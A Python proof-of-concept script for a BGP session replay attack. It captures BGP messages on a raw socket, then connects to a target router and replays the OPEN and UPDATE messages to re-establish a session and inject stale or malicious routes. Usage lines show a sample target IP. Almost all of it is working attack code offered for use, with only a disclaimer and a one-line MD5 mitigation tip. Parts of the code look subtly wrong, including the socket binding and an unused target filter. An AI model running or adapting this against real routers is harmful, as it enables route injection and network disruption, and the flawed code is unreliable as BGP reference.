#!/usr/bin/env python3
"""
BGP Session Replay Attack Proof-of-Concept

This script demonstrates the vulnerability described in RFC 4271 Section F.6,
where BGP sessions lacking TCP MD5 authentication are susceptible to replay attacks.

The script performs the following steps:
1. Captures a valid BGP OPEN message from a legitimate session.
2. Waits for the session to terminate or for a disruption.
3. Replays the captured OPEN message to re-establish the session.
4. Replays captured UPDATE messages to inject stale or malicious routing information.

Note: This script is for educational and security research purposes only.
Unauthorized use against systems you do not own or have explicit permission to test is illegal.
"""

import socket
import struct
import sys
import time
import threading
import ipaddress

# BGP Constants
BGP_PORT = 179
BGP_VERSION = 4
BGP_MSG_OPEN = 1
BGP_MSG_UPDATE = 2
BGP_MSG_NOTIFICATION = 3
BGP_MSG_KEEPALIVE = 4

# Helper function to create a BGP message header
def create_bgp_header(msg_type, msg_length):
    """
    Creates a BGP message header.
    Format:
        16 bytes of marker (all 1s)
        2 bytes of message length
        1 byte of message type
    """
    marker = b'\xff' * 16
    header = marker + struct.pack('!H', msg_length) + struct.pack('!B', msg_type)
    return header

# Helper function to create a BGP OPEN message
def create_bgp_open_message(my_as, hold_time, bgp_id, opt_params_len=0):
    """
    Creates a BGP OPEN message.
    Format:
        1 byte Version
        2 bytes My Autonomous System
        2 bytes Hold Time
        4 bytes BGP Identifier
        1 byte Opt Parm Len
        Variable Optional Parameters
    """
    open_msg = struct.pack('!B', BGP_VERSION)  # Version
    open_msg += struct.pack('!H', my_as)       # My Autonomous System
    open_msg += struct.pack('!H', hold_time)   # Hold Time
    open_msg += bgp_id                         # BGP Identifier (4 bytes)
    open_msg += struct.pack('!B', opt_params_len)  # Opt Parm Len
    return open_msg

# Helper function to create a BGP UPDATE message
def create_bgp_update_message(withdrawn_routes_len, withdrawn_routes, total_attr_len, path_attributes, nlri):
    """
    Creates a BGP UPDATE message.
    Format:
        2 bytes Withdrawn Routes Length
        Variable Withdrawn Routes
        2 bytes Total Path Attribute Length
        Variable Path Attributes
        Variable NLRI
    """
    update_msg = struct.pack('!H', withdrawn_routes_len)
    update_msg += withdrawn_routes
    update_msg += struct.pack('!H', total_attr_len)
    update_msg += path_attributes
    update_msg += nlri
    return update_msg

# Helper function to create a BGP KEEPALIVE message
def create_bgp_keepalive_message():
    """
    Creates a BGP KEEPALIVE message.
    Format: Just the header, no additional data.
    """
    return b''

# Function to capture BGP traffic
def capture_bgp_traffic(interface, target_ip, target_port=BGP_PORT):
    """
    Captures BGP traffic on the specified interface.
    This is a simplified capture function for demonstration purposes.
    In a real scenario, you would use a library like scapy or libpcap.
    """
    print(f"[*] Starting BGP traffic capture on interface {interface}...")
    captured_messages = []
    
    # Create a raw socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.bind((interface, 0))
    except Exception as e:
        print(f"[!] Failed to create raw socket: {e}")
        print("[!] Please run with root privileges.")
        sys.exit(1)
    
    # Set socket options to receive all packets
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # Capture loop
    try:
        while len(captured_messages) < 10:  # Capture up to 10 messages for demo
            data, addr = sock.recvfrom(65535)
            # Parse IP and TCP headers to extract BGP payload
            # This is a simplified parsing logic
            if len(data) > 40:  # Minimum IP + TCP header length
                ip_header = data[:20]
                tcp_header = data[20:40]
                
                # Extract source and destination ports
                src_port = struct.unpack('!H', tcp_header[0:2])[0]
                dst_port = struct.unpack('!H', tcp_header[2:4])[0]
                
                # Check if the packet is BGP traffic
                if src_port == BGP_PORT or dst_port == BGP_PORT:
                    # Extract BGP payload
                    tcp_payload_offset = (tcp_header[12] >> 4) * 4
                    bgp_payload = data[20 + tcp_payload_offset:]
                    
                    if len(bgp_payload) >= 19:  # Minimum BGP message length
                        # Extract BGP message type and length
                        msg_length = struct.unpack('!H', bgp_payload[16:18])[0]
                        msg_type = struct.unpack('!B', bgp_payload[18:19])[0]
                        
                        if len(bgp_payload) >= msg_length:
                            bgp_message = bgp_payload[:msg_length]
                            captured_messages.append((bgp_message, msg_type, addr))
                            print(f"[+] Captured BGP message type {msg_type} from {addr[0]}")
    except KeyboardInterrupt:
        print("\n[!] Capture stopped by user.")
    finally:
        sock.close()
    
    return captured_messages

# Function to replay BGP messages
def replay_bgp_messages(captured_messages, target_ip, target_port=BGP_PORT):
    """
    Replays captured BGP messages to the target.
    """
    print(f"[*] Starting BGP message replay to {target_ip}:{target_port}...")
    
    # Create a TCP socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        print(f"[+] TCP connection established to {target_ip}:{target_port}")
    except Exception as e:
        print(f"[!] Failed to connect to target: {e}")
        sys.exit(1)
    
    try:
        for bgp_message, msg_type, _ in captured_messages:
            if msg_type == BGP_MSG_OPEN:
                print("[*] Replaying BGP OPEN message...")
                sock.sendall(bgp_message)
                time.sleep(1)  # Wait for response
                
                # Receive KEEPALIVE
                response = sock.recv(4096)
                if len(response) >= 19:
                    resp_type = struct.unpack('!B', response[18:19])[0]
                    if resp_type == BGP_MSG_KEEPALIVE:
                        print("[+] Received BGP KEEPALIVE in response to OPEN")
                    elif resp_type == BGP_MSG_NOTIFICATION:
                        print("[!] Received BGP NOTIFICATION in response to OPEN")
                        print(f"[!] Notification data: {response.hex()}")
                        break
                else:
                    print("[!] No valid response received")
                    break
            
            elif msg_type == BGP_MSG_UPDATE:
                print("[*] Replaying BGP UPDATE message...")
                sock.sendall(bgp_message)
                time.sleep(1)  # Wait for response
                
                # Receive response (could be KEEPALIVE or NOTIFICATION)
                response = sock.recv(4096)
                if len(response) >= 19:
                    resp_type = struct.unpack('!B', response[18:19])[0]
                    if resp_type == BGP_MSG_KEEPALIVE:
                        print("[+] Received BGP KEEPALIVE in response to UPDATE")
                    elif resp_type == BGP_MSG_NOTIFICATION:
                        print("[!] Received BGP NOTIFICATION in response to UPDATE")
                        print(f"[!] Notification data: {response.hex()}")
                        break
                else:
                    print("[!] No valid response received")
                    break
    except Exception as e:
        print(f"[!] Error during replay: {e}")
    finally:
        sock.close()
        print("[*] TCP connection closed.")

# Main function
def main():
    if len(sys.argv) < 3:
        print("Usage: python poc_bgp_session_replay_attack.py <interface> <target_ip>")
        print("Example: python poc_bgp_session_replay_attack.py eth0 192.168.1.1")
        sys.exit(1)
    
    interface = sys.argv[1]
    target_ip = sys.argv[2]
    
    print("="*60)
    print("BGP Session Replay Attack Proof-of-Concept")
    print("="*60)
    print(f"[*] Target IP: {target_ip}")
    print(f"[*] Capture Interface: {interface}")
    print("="*60)
    
    # Step 1: Capture BGP traffic
    print("\n[Step 1] Capturing BGP traffic...")
    captured_messages = capture_bgp_traffic(interface, target_ip)
    
    if not captured_messages:
        print("[!] No BGP messages captured. Exiting.")
        sys.exit(1)
    
    # Step 2: Wait for session termination (simulated)
    print("\n[Step 2] Waiting for session termination...")
    print("[*] In a real attack, the attacker would wait for the legitimate session to terminate.")
    print("[*] For this demo, we will proceed immediately.")
    time.sleep(2)
    
    # Step 3: Replay BGP messages
    print("\n[Step 3] Replaying BGP messages...")
    replay_bgp_messages(captured_messages, target_ip)
    
    print("\n[+] Replay attack demonstration complete.")
    print("[!] Remember to enable TCP MD5 authentication to mitigate this vulnerability.")

if __name__ == "__main__":
    main()
